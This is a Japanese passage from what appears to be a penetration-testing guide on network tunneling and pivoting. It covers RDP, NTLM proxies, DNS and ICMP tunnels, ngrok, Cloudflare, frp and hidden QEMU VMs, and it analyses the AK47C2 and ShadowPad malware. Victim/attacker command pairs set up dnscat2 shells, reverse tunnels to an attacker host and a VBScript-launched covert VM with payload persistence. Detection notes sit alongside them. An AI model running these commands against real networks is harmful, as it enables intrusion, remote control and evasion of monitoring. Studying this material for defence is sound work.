2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

クライアントコンピューターで **`SocksOverRDP-Plugin.dll`** を次のように読み込みます。

```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

**`mstsc.exe`**を使って**被害者**に**RDP**で**接続**できるようになりました。**SocksOverRDP pluginが有効**で、**127.0.0.1:1080**で**リッスン**するという**プロンプト**が表示されるはずです。

**RDP**で**接続**し、被害者のマシンに`SocksOverRDP-Server.exe`バイナリをアップロードして実行します。

```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```

次に、攻撃者側のマシンでポート1080がリッスンしていることを確認します:

```
netstat -antb | findstr 1080
```

これで[**Proxifier**](https://www.proxifier.com/)を使い、そのポート経由でトラフィックをプロキシできます。<sup>[[26]](#references)</sup>

### RDP仮想チャネルのハンティング

[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling)もRDP仮想チャネルを使うトンネルです。デフォルトのチャネル名は`rdp2tcp`ですが、オペレーターは別の名前を選択できます。<sup>[[56]](#references)</sup> チャネルの作成と切断は、`Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational`にイベントID **132**および**148**として記録されます。`rdp2tcp`や、珍しい／ランダムなチャネル名を探し、`XPSRD`、`cliprdr`、`Microsoft::Windows::RDS::DisplayControl`などの想定されるチャネルと比較してください。<sup>[[58]](#references)</sup>

## Windows GUIアプリをプロキシ経由で通信させる

[**Proxifier**](https://www.proxifier.com/)を使えば、Windows GUIアプリの通信をプロキシ経由にできます。<sup>[[26]](#references)</sup>\
**Profile -> Proxy Servers**で、SOCKSサーバーのIPアドレスとポートを追加します。\
**Profile -> Proxification Rules**で、プロキシ経由にするプログラム名と、対象とするIPアドレスへの接続を追加します。Proxifierのルールでは、アプリケーション、接続先ホスト、ポートを条件にできます。<sup>[[27]](#references)</sup>

## NTLMプロキシ経由のトンネル

前述のツール**Rpivot**は、NTLM認証を行うプロキシ経由でリレーできます。**OpenVPN**も、auth fileとNTLMv2方式を設定すれば、そのようなプロキシ経由でルーティングできます。これはプロキシ認証のバイパスではなく、プロキシを介した通信です。<sup>[[20]](#references)[[28]](#references)</sup>

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlmは上流のNTLM proxyに対して認証し、ローカルのリスナーを公開して、ローカルのトンネルポートを宛先サービスにマッピングできます。クライアントはそのローカルポートを利用できます。<sup>[[29]](#references)</sup>\
たとえば、ポート443をforwardします。

```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

たとえば、victim側で**SSH**サービスがポート443をリッスンするように設定すると、attacker側のポート2222を通じて接続できます。<sup>[[29]](#references)</sup>\
attacker側がポート2222をリッスンしている状態で、localhost:443に接続する**meterpreter**を使うこともできます。<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) は、Microsoftの.NET reverse-proxy toolkitです。こちらから入手できます: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)。<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

IodineはDNS queriesを通じてIPv4 tunnelを作成し、TUN interfacesを使用します。文書化されているセットアップでは、両端でこれらのinterfacesを作成するために必要な権限が求められます。<sup>[[31]](#references)</sup>

```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

DNS transportは直接TCPよりオーバーヘッドが大きく、通常は遅いため、このトンネル経由で圧縮SSH接続を作成できます:<sup>[[31]](#references)</sup>

```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

[**こちらからダウンロード**](https://github.com/iagox86/dnscat2)**.**

Dnscat2はDNS経由で暗号化されたコマンド＆コントロールチャネルを確立します。以下のサーバーおよびクライアントのコマンドは、公式ドキュメントに記載された使用方法に従っています。<sup>[[32]](#references)</sup>

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```

#### **PowerShellで**

[**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell)を使うと、PowerShellでdnscat2クライアントを実行できます。READMEには、以下に示す`Start-Dnscat2`のパラメーターが記載されています。<sup>[[33]](#references)</sup>

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```

#### **dnscatを使ったポートフォワーディング**

dnscat2の対話型`listen`コマンドは、ローカルリスナーをリモートホストとポートにマッピングします。<sup>[[32]](#references)</sup>

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### proxychains の DNS を変更する

Proxychains-ng は動的リンクされた TCP 接続をフックしますが、UDP や ICMP は転送できません。DNS のプロキシ設定は変更可能なので、固定のパブリック resolver を想定せず、インストールされている `proxychains.conf` と resolver helper を確認してください。レガシーな `proxyresolv` スクリプトでは、resolver を選択するために `PROXY_DNS_SERVER` を指定できます。内部名が必要な場合は、pivot から到達可能な resolver を使用してください。<sup>[[34]](#references)[[35]](#references)</sup>

## Go のトンネル

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### カスタム DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 actor は、企業ネットワークでブロックされることがまれな2つのプロトコル、外向きの **DNS** と **プレーンな HTTP POST** トラフィックのみを悪用する**デュアルチャネル C2（「AK47C2」）**を作成しました。<sup>[[2]](#references)</sup>

1. **DNS モード（AK47DNS）**
   • ランダムな5文字の SessionID（例：`H4T14`）を生成します。  
   • *タスクリクエスト*には `1`、*結果*には `2` を先頭に付け、異なるフィールド（フラグ、SessionID、コンピューター名）を連結します。  
   • 各フィールドは **ASCII キー `VHBD@H` で XOR 暗号化**され、16進数にエンコードされた後、ドットで連結されます。最後に攻撃者が制御するドメインが続きます。

   ```text
   <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
   ```

   • リクエストでは、**TXT**レコード（およびフォールバックとして**MG**レコード）に `DnsQuery()` を使用します。  
   • 応答が0xFFバイトを超えると、backdoorはデータを63バイト単位に**分割**し、C2サーバーが並べ替えられるよう、次のマーカーを挿入します:
     `s<SessionID>t<TOTAL>p<POS>`

2. **HTTP mode (AK47HTTP)**
   • JSONエンベロープを構築します:
   ```json
   {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
   ```
   • blob 全体を XOR-`VHBD@H` → hex に変換し、ヘッダー `Content-Type: text/plain` を付けた **`POST /`** の body として送信します。
   • 応答も同じ encoding に従い、`cmd` フィールドは `cmd.exe /c <command> 2>&1` で実行されます。

Blue Team のメモ
• 最初のラベルが長い hexadecimal で、常に同じ珍しいドメインで終わる、不審な **TXT queries** を探します。  
• 固定の XOR key の後に ASCII-hex が続くパターンは、YARA で簡単に検出できます: `6?56484244?484`（`VHBD@H` の hex 表記）。  
• HTTP では、純粋な hex で、2 bytes の倍数になっている text/plain の POST body を検出します。

{{#note}}
この channel では各サブドメインラベルを DNS の 63-octet 制限内に収めていますが、protocol に準拠していても stealthy とは限りません。珍しいドメイン、長い hexadecimal ラベル、query の量は、引き続き検出シグナルとなります。<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans は、TUN device と ICMP echo request を使用する IPv4-over-ICMP tunnel を説明しています。この設定には、interface を作成できるだけの権限が必要です。<sup>[[37]](#references)</sup>

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

### ptunnel-ng

[**Download it from here**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng は ICMP 経由で TCP 接続を転送し、以下に示す `-p`、`-l`、`-r`、`-R` オプションを、それぞれ proxy、ローカルリスナー、宛先ホスト、宛先ポートに使用します。<sup>[[38]](#references)</sup>

```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## ngrok

[**ngrok**](https://ngrok.com/) は、セキュアなトンネルを通じてローカルネットワークのサービスをオンラインで公開するためのエージェントです。CLI では HTTP、TCP、ファイル URL のエンドポイントが説明されており、表示されるエンドポイントのホスト名は、エンドポイントやアカウントによって異なる場合があります。<sup>[[39]](#references)</sup>

### インストール

- アカウントを作成: https://ngrok.com/signup
- クライアントのダウンロード:

```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```

### 基本的な使い方

**ドキュメント:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_必要に応じて、agent は認証および TLS オプションにも対応しています。<sup>[[39]](#references)</sup>_

#### TCPのトンネリング

```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```

#### HTTPでファイルを公開する

```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```

#### HTTP callsのSniffing

_XSS、SSRF、SSTIなどに有用_\
standalone agentは、デフォルトで`http://127.0.0.1:4040`にHTTP inspection interfaceを公開します。このinterfaceはHTTP traffic用です。<sup>[[40]](#references)</sup>

#### 内部HTTP serviceのTunneling

`--host-header=rewrite`オプションは、upstream HTTPの`Host` headerを書き換えて、local serviceに一致させます。<sup>[[41]](#references)</sup>

```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```

#### ngrok.yaml のシンプルな設定例

これは ngrok Agent Config v2 を使用します。名前付きトンネルでは `proto` と `addr` を使い、`ngrok start` で起動します。<sup>[[42]](#references)</sup> 3 つのトンネルを開きます。

- TCP 2 つ
- /tmp/httpbin/ から静的ファイルを公開する HTTP 1 つ

```yaml
version: 2
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

## Microsoft Dev Tunnels

Microsoft Dev Tunnels は、Microsoft のリレーインフラストラクチャを通じて、ローカルの TCP ベースのサービスを公開できます。ホスト CLI はアウトバウンドトンネルを作成し、クライアント側では `devtunnel connect` によってホストされたポートを再現します。アクセス制御を意図的に緩和しない限り、トンネルにはデフォルトで認証が必要です。<sup>[[55]](#references)[[58]](#references)</sup>

```bash
# Compromised/pivot host: publish its local RDP service
# Save the tunnel ID printed by this command
devtunnel host -p 3389

# Operator host: authenticate as an authorized tunnel user and create
# a local 127.0.0.1:3389 forward to the hosted port
devtunnel connect <TUNNEL_ID>
xfreerdp /u:<USER> /v:127.0.0.1:3389
```

これにより、境界で新たな受信リスナーを開かずに、`*.devtunnels.ms` 経由で RDP を公開できます。また、`rdp2tcp` のような RDP virtual-channel tunnel と組み合わせることで、RDP セッションを任意の TCP トラフィック向けの第 2 段階の pivot として利用できます。<sup>[[58]](#references)</sup>

ハンティングでは、Dev Tunnels CLI の実行を、`*.devtunnels.ms` への DNS/TLS トラフィックや、予期しない RDP virtual-channel イベントと関連付けて調査します。Microsoft 所有の relay を使用しているからといって、認証済みの tunnel が無害とは限りません。<sup>[[58]](#references)</sup>

## Cloudflared (Cloudflare Tunnel)

Cloudflare Tunnel の `cloudflared` connector は外向き接続を確立します。公開されたアプリケーションは HTTP、HTTPS、TCP、SSH、RDP をルーティングできます。一方、quick tunnel は HTTP 開発向けです。<sup>[[43]](#references)[[45]](#references)</sup>

### Quick tunnel のワンライナー

```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```

### SOCKS5 origin（レガシーモード）

レガシーな `--socks5` フラグは、ローカルのオリジンが SOCKS5 を使用することを `cloudflared` に伝えるものであり、ローカルに SOCKS5 リスナーを作成するものではありません。managed tunnel では、`originRequest.proxyType: socks` によって SOCKS5 のオリジン処理を設定します。<sup>[[44]](#references)</sup>

```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```

### DNSによる永続的なトンネル

ローカルで管理されるトンネル構成では、以下のように小文字の `tunnel`、`credentials-file`、`url` キーを使用します。<sup>[[46]](#references)</sup>

```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```

コネクターを起動:

```bash
cloudflared tunnel run mytunnel
```

connectorはoutbound接続を確立し、デフォルトではQUICをネゴシエートし、失敗した場合はHTTP/2にフォールバックします。すべてのデプロイメントでTCP/443が使われると想定しないでください。デプロイメントに必要な権限だけを付与して実行してください。<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp)は、**TCP、UDP、HTTP/S、STCP/SUDP、TCPMUX、XTCP**をサポートするGo製reverse proxyです。XTCPはP2P hole punchingを使用し、その成功はNATに依存します。**v0.53.0**以降は**SSH Tunnel Gateway**として動作できるため、ターゲットホストは`frpc`バイナリなしで標準のOpenSSHクライアントを使用できます。<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### 従来型のreverse TCP tunnel

```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```

### 新しいSSH gatewayを使用する（frpcバイナリなし）

```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

上記のコマンドは、`frps`をゲートウェイとして、標準のOpenSSH clientを使い、victimのポート**8080**を**attacker_ip:9000**として公開します。<sup>[[50]](#references)</sup>

## STUN-assisted UDP back-connects

UDP socketから送信されたSTUN Binding requestにより、そのsocketのserver-reflexive IP addressとポートを特定できます。また、定期的な通信によってNAT bindingを維持できます。公開STUN serverは、任意の制御パケットを中継するものではありません。<sup>[[60]](#references)</sup> 分析対象となったback-connectの設計では、短い制御データグラムの送信に同じUDP socketを使用し、トリガーを受信した後、*別のoutbound TCP connection*を使ってコマンドを取得・実行していました。<sup>[[59]](#references)</sup>

controllerからUDP packetを受信するには、設計上、controllerとmappingを共有し、NATのfiltering policyも満たす必要があります。Address-dependentまたはport-dependent filteringでは、STUN serverからの応答は許可されても、別のendpointからのpacketは破棄される場合があります。<sup>[[60]](#references)[[61]](#references)</sup> 分析対象となったbackdoorのrendezvous経路は検証されていないため、STUNの応答に成功しただけでは、その制御channelに到達可能であるとは証明できません。<sup>[[59]](#references)</sup> rendezvousとrelay fallbackを明示的に備えた別のprotocolについては、[PPPP camera NAT traversal](../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md#nat-traversal-and-transport)を参照してください。

## QEMUを使った隠蔽VMベースのTunnel

QEMU user-mode networkingでは、仮想ネットワークにrootまたはadministrator権限は不要です。また、`-netdev user,hostfwd=...`を使うと、hostからguestへTCP、UDP、またはUNIX connectionを転送できます。<sup>[[51]](#references)</sup> TrustedSecは、hostを中心とするEDRではguest内のアクティビティを検出できない可能性があったインシデントにおいて、Tiny Core QEMU VMと、reverse SSH tunnelの試みについて記録しています。<sup>[[1]](#references)</sup>

### 簡単なワンライナー

```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
   -m 256M ^
   -drive file=tc.qcow2,if=ide ^
   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
   -device e1000,netdev=n0 ^
   -nographic
```

• 上記のコマンドは、ゲストメモリが256 MiBで、qcow2ディスクイメージを使用する**Tiny Core Linux**ゲストを起動します。このディスクイメージはRAMディスクではありません。
• Windowsホストの**2222/tcp**は、ゲスト内部の**22/tcp**に透過的に転送されます。
• 攻撃者から見ると、ターゲットは単にポート2222を公開しているように見えます。そこに到達したパケットはすべて、VM内で動作するSSHサーバーによって処理されます。

### VBScriptを使ったステルスな起動

TrustedSecは、上記のインシデントでVBSによるQEMUの起動とTiny Coreイメージが使われたことを確認しました。<sup>[[1]](#references)</sup>

```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```

`cscript.exe //B update.vbs` でスクリプトを実行すると、ウィンドウは非表示のままです。<sup>[[1]](#references)</sup>

### ゲスト内での永続化

引用されているインシデントでは、stateless な Tiny Core ゲストで `/opt/bootlocal.sh` と `/opt/filetool.lst` を介して永続化しています。<sup>[[1]](#references)</sup>

1. ペイロードを `/opt/123.out` に配置する  
2. `/opt/bootlocal.sh` に追記する:

   ```sh
   while ! ping -c1 45.77.4.101; do sleep 2; done
   /opt/123.out
   ```

3. シャットダウン時に payload が `mydata.tgz` にパックされるよう、`home/tc` と `opt` を `/opt/filetool.lst` に追加します。

### Telemetry に関する考慮事項

• ホスト上では引き続き、QEMU プロセス、qcow2 イメージ、ホスト側でポート転送された listener が確認できます。  
• ホストのみを対象としたプロセススキャンではゲストのプロセスを調査しない場合がありますが、仮想化によって検知を回避できるとは限りません。ネットワーク、QEMU、イメージの telemetry から露見する可能性があります。<sup>[[1]](#references)[[51]](#references)</sup>

### Defender 向けのヒント

• ユーザーが書き込み可能なパスにある**予期しない QEMU/VirtualBox/KVM バイナリ**を検知する。  
• `qemu-system*.exe` から発信されるアウトバウンド接続をブロックする。  
• QEMU の起動直後にバインドする、使用頻度の低い待受ポート（2222、10022、…）を調査する。

## `HttpAddUrl` を介した IIS/HTTP.sys relay ノード（ShadowPad）

Check Point によると、ShadowPad の IIS モジュールは、`HttpAddUrl` を介して URL prefix をバインドし、侵害した境界 Web サーバーを backdoor および relay ノードに変えます。<sup>[[3]](#references)</sup>

同レポートでは、以下にまとめたデフォルト設定、wildcard listener、パケットの復号、relay キュー、デバッグ telemetry についても詳しく説明しています。<sup>[[3]](#references)</sup>

* **設定のデフォルト値** – モジュールの JSON 設定で値が省略されると、もっともらしい IIS のデフォルト値（`Server: Microsoft-IIS/10.0`、`DocumentRoot: C:\inetpub\wwwroot`、`ErrorPage: C:\inetpub\custerr\en-US\404.htm`）にフォールバックします。これにより、通常のトラフィックには IIS が適切なブランド表示で応答します。
* **Wildcard による傍受** – オペレーターは URL prefix のセミコロン区切りリスト（ホストとパスに wildcard を含む）を指定します。モジュールは各エントリーに対して `HttpAddUrl` を呼び出すため、一致するリクエストは HTTP.sys によって悪意のある handler にルーティングされ、一致しないリクエストは通常の IIS の動作にフォールバックします。
* **暗号化された最初のパケット** – リクエスト本文の先頭 2 バイトには、カスタム 32-bit PRNG の seed が格納されます。プロトコルを解析する前に、それ以降の各バイトは生成された keystream と XOR されます：

  ```python
  def decrypt_first_packet(buf):
      seed = buf[0] | (buf[1] << 8)
      num = seed & 0xFFFFFFFF
      out = bytearray(buf)
      for i in range(2, len(out)):
          hi = (num >> 16) & 0xFFFF
          num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
          out[i] ^= num & 0xFF
      return out
  ```

* **Relay orchestration** – このモジュールは「servers」（上流ノード）と「clients」（下流のimplant）の2つのリストを管理します。約30秒以内にheartbeatが届かないエントリは削除されます。両方のリストにエントリがある場合、最初の正常なserverと最初の正常なclientをペアにし、片側のソケットが閉じるまで、両者の間でバイトデータをそのまま転送します。
* **Debug telemetry** – オプションのログには、各ペアリングの送信元IP、宛先IP、転送バイト数の合計が記録されます。調査担当者は、これらの手がかりを使って複数の被害者にまたがるShadowPadのmeshを再構築しました。

---

## Other tools to check

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [影に潜む：QEMU Virtualizationを介したCovert Tunnels](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – ToolShell以前：Storm-2603の過去のRansomware Operationsを探る](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Ink Dragonの内部：Stealthy Offensive OperationのRelay Networkと内部動作を明らかにする](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmap Reference Guide：Firewall/IDSの制限を回避する](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD sshマニュアル](https://man.openbsd.org/ssh)
- [7] [OpenBSD sshd_configマニュアル](https://man.openbsd.org/sshd_config)
- [8] [OpenSSH 9.6リリースノート](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit：MetasploitでのPivoting](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Metasploit socks_proxy moduleのドキュメント](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Metasploit autoroute moduleのドキュメント](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike：SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike：Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ngクイックスタート](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Listeners](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socatマニュアル](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY Plinkマニュアル](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTYコマンドラインオプション](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft netsh interface portproxyコマンド](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Proxifierドキュメント](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier Proxification Rules](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN 2.7マニュアル](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035：Domain Names - 実装と仕様](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok Web Inspection Interface](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok virtual hosts](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Cloudflare Tunnelの概要](https://developers.cloudflare.com/tunnel/)
- [44] [Cloudflare Tunnelのorigin parameters](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Cloudflare Tunnelのセットアップ](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Cloudflare Tunnelの設定ファイル](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Cloudflare Tunnelの実行パラメーター](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frpの概念](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [QEMU networkingのドキュメント](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [NetSPI BOFScaleのソースリポジトリ](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale：BOF-PEからのCDN-Fronted Tailnet](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
- [55] [Microsoft Learn - Dev Tunnels CLIコマンド](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
- [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
- [57] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [58] [NightEagle APT：GhostContainerとTunneling](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
- [59] [FortiGuard Labs - ClingSTUN Linux Backdoorが公開STUNインフラを悪用](https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure)
- [60] [RFC 8489 - NAT traversalのためのSession Traversal Utilities（STUN）](https://www.rfc-editor.org/rfc/rfc8489.html)
- [61] [RFC 4787 - Unicast UDPのためのNAT動作要件](https://www.rfc-editor.org/rfc/rfc4787.html)
- [62] [Tailcat README](https://github.com/tailscale/tailcat/blob/main/README.md)
- [63] [Malwarebytes - Kothamine malwareがTailscaleのtailcatを使ってネットワーク検知を回避](https://www.malwarebytes.com/blog/threat-intel/2026/09/kothamine-malware-uses-tailscales-tailcat-to-evade-network-detection)
- [64] [Yggstack README](https://github.com/yggdrasil-network/yggstack)
- [65] [Yggdrasilの設定：peerへの接続](https://yggdrasil-network.github.io/configuration.html)
- [66] [Yggdrasil FAQ：匿名性とpeering](https://yggdrasil-network.github.io/faq.html)
- [67] [ESET Research：MythicRatatoskr Yggdrasil対応backdoor](https://www.welivesecurity.com/en/eset-research/mythicratatoskr-yggdrasil-enabled-backdoor-deployed-uac0099-sandworm-collaboration)
{{#include ../banners/hacktricks-training.md}}
